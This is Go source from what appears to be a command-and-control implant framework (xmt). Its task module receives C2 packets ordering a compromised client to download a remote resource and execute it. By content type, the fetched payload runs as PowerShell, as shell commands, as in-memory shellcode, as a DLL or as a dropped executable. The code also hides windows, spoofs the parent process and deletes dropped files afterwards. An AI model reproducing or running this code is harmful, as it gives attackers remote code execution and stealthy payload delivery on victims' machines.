package task

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
)

// PullExec will instruct the client to download the resource from the provided
// URL and execute the downloaded data.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension.
//
// Returns the same output as the 'Run*' tasks.
//
// C2 Details:
//  ID: TvPullExecute
//
//  Input:
//      - string (url)
//      - bool (wait)
//      - bool (Filer != nil)
//      - Filter
//  Output:
//      - uint32 (pid)
//      - int32 (exit code)
func PullExec(url string) *com.Packet {
	return PullExecEx(url, nil, true)
}

// Pull will instruct the client to download the resource from the provided
// URL and write the data to the supplied local filesystem path.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvPull
//
//  Input:
//      - string (url)
//      - string (path)
//  Output:
//      - string (expanded path)
//      - int64 (file size written)
func Pull(url, path string) *com.Packet {
	n := &com.Packet{ID: TvPull}
	n.WriteString(url)
	n.WriteString(path)
	return n
}

// PullExecEx will instruct the client to download the resource from the provided
// URL and execute the downloaded data.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension.
//
// This function allows for specifying a Filter struct to specify the target
// parent process and the boolean flag can be set to true/false to specify
// if the task should wait for the process to exit.
//
// Returns the same output as the 'Run*' tasks.
//
// C2 Details:
//  ID: TvPullExecute
//
//  Input:
//      - string (url)
//      - bool (wait)
//      - bool (Filer != nil)
//      - Filter
//  Output:
//      - uint32 (pid)
//      - int32 (exit code)
func PullExecEx(url string, f *cmd.Filter, w bool) *com.Packet {
	n := &com.Packet{ID: TvPullExecute}
	n.WriteString(url)
	if n.WriteBool(w); f == nil {
		n.WriteBool(false)
	} else {
		n.WriteBool(true)
		f.MarshalStream(n)
	}
	return n
}
func pull(x context.Context, r data.Reader, w data.Writer) error {
	u, err := r.StringVal()
	if err != nil {
		return err
	}
	p, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		h, _ = http.NewRequestWithContext(x, http.MethodGet, u, nil)
		o    *http.Response
	)
	if o, err = request(h); err != nil {
		return err
	}
	var (
		v = device.Expand(p)
		f *os.File
	)
	if f, err = os.OpenFile(v, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0755); err != nil {
		o.Body.Close()
		return err
	}
	n, err := f.ReadFrom(o.Body)
	o.Body.Close()
	w.WriteString(v)
	w.WriteInt64(n)
	return err
}
func web(x context.Context, u string) (cmd.Runnable, string, error) {
	var (
		r, _   = http.NewRequestWithContext(x, http.MethodGet, u, nil)
		o, err = request(r)
	)
	if err != nil {
		return nil, "", err
	}
	b, err := io.ReadAll(o.Body)
	if o.Body.Close(); err != nil {
		return nil, "", err
	}
	if bugtrack.Enabled {
		bugtrack.Track("task.web(): Download u=%s", u)
	}
	var d bool
	switch strings.ToLower(o.Header.Get("Content-Type")) {
	case "cmd/dll", "application/dll":
		d = true
	case "cmd/powershell", "application/powershell":
		e := cmd.NewProcessContext(x)
		if device.OS == device.Windows {
			e.Args = []string{"powershell.exe", "-Comm", string(b)}
		} else {
			e.Args = []string{"pwsh", "-Comm", string(b)}
		}
		return e, "", nil
	case "cmd/cmd", "cmd/execute", "cmd/script", "application/cmd", "application/execute", "application/script":
		e := cmd.NewProcessContext(x)
		e.Args = append([]string{device.Shell}, device.ShellArgs...)
		e.Args = append(e.Args, string(b))
		return e, "", nil
	case "cmd/asm", "cmd/binary", "cmd/assembly", "cmd/shellcode", "application/asm", "application/binary", "application/assembly", "application/shellcode":
		if bugtrack.Enabled {
			bugtrack.Track("task.web(): Download is shellcode u=%s", u)
		}
		return cmd.NewAsmContext(x, b), "", nil
	}
	var n string
	if d {
		n = "*.dll"
	} else if device.OS == device.Windows {
		n = "*.exe"
	} else {
		n = "*.so"
	}
	f, err := os.CreateTemp("", n)
	if err != nil {
		return nil, "", err
	}
	p := f.Name()
	_, err = f.Write(b)
	if f.Close(); err != nil {
		return nil, p, err
	}
	if bugtrack.Enabled {
		bugtrack.Track("task.web(): Download to tempfile u=%s, p=%s", u, p)
	}
	if os.Chmod(p, 0755); n == "*.dll" {
		return cmd.NewDllContext(x, p), p, nil
	}
	return cmd.NewProcessContext(x, p), p, nil
}
func pullExec(x context.Context, r data.Reader, w data.Writer) error {
	u, err := r.StringVal()
	if err != nil {
		return err
	}
	q, err := r.Bool()
	if err != nil {
		return err
	}
	var f *cmd.Filter
	if v, err2 := r.Bool(); err2 != nil {
		return err2
	} else if v {
		f = new(cmd.Filter)
		if err2 = f.UnmarshalStream(r); err2 != nil {
			return err2
		}
	}
	e, p, err := web(x, u)
	if err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	if f == nil {
		e.SetParent(cmd.AnyParent)
	} else {
		e.SetParent(f)
	}
	var o bytes.Buffer
	if k, ok := e.(*cmd.Process); ok {
		if k.SetWindowDisplay(0); q {
			k.Stdout = &o
			k.Stderr = &o
		}
	}
	if err = e.Start(); err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	if w.WriteUint32(e.Pid()); !q {
		if w.WriteInt32(0); len(p) > 0 {
			go func() {
				e.Wait()
				os.Remove(p)
			}()
		}
		return nil
	}
	err = e.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	c, _ := e.ExitCode()
	w.WriteInt32(c)
	io.Copy(w, &o)
	if o.Reset(); len(p) > 0 {
		os.Remove(p)
	}
	return err
}
